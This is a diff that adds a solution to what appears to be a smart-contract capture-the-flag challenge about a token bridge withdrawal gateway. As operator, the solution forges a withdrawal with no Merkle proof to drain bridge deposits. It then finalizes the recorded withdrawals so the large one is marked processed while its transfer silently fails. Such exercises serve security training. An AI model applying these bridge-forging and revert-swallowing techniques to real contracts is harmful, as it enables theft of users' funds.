@@ -29,6 +29,11 @@ contract WithdrawalChallenge is Test {
     L1Forwarder l1Forwarder;
     L1Gateway l1Gateway;
 
+    struct LogEntry {
+        bytes data;
+        bytes32[] topics;
+    }
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -89,7 +94,42 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Past the 7-day delay for every timestamp we're about to use
+        vm.warp(START_TIMESTAMP + 8 days);
+
+        // 1. Forged "spoiler" withdrawal. As an OPERATOR, the Merkle proof check is
+        //    skipped entirely, so the player can submit any (nonce, l2Sender, target,
+        //    timestamp, message) tuple of their choosing. This one legitimately routes
+        //    through L1Forwarder -> TokenBridge and really moves ~1,001 DVT out --
+        //    just enough to push totalDeposits below 999,000e18 before the real
+        //    suspicious withdrawal is attempted.
+        address dump = makeAddr("dump");
+        uint256 depletion = 1_001e18;
+        bytes memory forgedInner = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (dump, depletion));
+        bytes memory forgedOuter =
+            abi.encodeCall(L1Forwarder.forwardMessage, (9999, l2Handler, address(l1TokenBridge), forgedInner));
+        l1Gateway.finalizeWithdrawal(
+            9999, l2Handler, address(l1Forwarder), START_TIMESTAMP, forgedOuter, new bytes32[](0)
+        );
+
+        // 2. Finalize all four REAL withdrawals, exactly as recorded on L2.
+        //    The three small (10 DVT) ones succeed normally.
+        //    The large (999,000 DVT) one gets marked `finalized` -- satisfying the
+        //    requirement that it was processed -- but its downstream transfer now
+        //    reverts due to the depleted totalDeposits, swallowed silently by
+        //    L1Gateway's unchecked low-level call. No funds move for it.
+        bytes memory json =
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json")));
+        LogEntry[] memory entries = abi.decode(json, (LogEntry[]));
+
+        for (uint256 i = 0; i < entries.length; i++) {
+            uint256 nonce = uint256(entries[i].topics[1]);
+            address l2Sender = address(uint160(uint256(entries[i].topics[2])));
+            address target = address(uint160(uint256(entries[i].topics[3])));
+            (, uint256 timestamp, bytes memory message) = abi.decode(entries[i].data, (bytes32, uint256, bytes));
+
+            l1Gateway.finalizeWithdrawal(nonce, l2Sender, target, timestamp, message, new bytes32[](0));
+        }
     }
 
     /**
